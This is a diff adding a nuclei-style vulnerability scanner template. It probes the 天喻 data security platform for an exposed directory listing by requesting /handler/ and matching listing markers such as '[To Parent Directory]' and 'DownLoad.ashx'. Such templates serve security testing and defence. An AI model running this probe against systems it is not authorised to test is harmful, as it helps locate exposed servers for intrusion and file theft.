@@ -1,0 +1,23 @@
+id: poc-yaml-hustcad-directory-traversal
+info:
+  name: 天喻软件数据安全平台 目录遍历漏洞
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: directory-traversal
+http:
+  - raw:
+      - |
+        GET /handler/ HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "/handler/"
+          - "[To Parent Directory]"
+          - "DownLoad.ashx"
+          - "HREF="
+        part: body
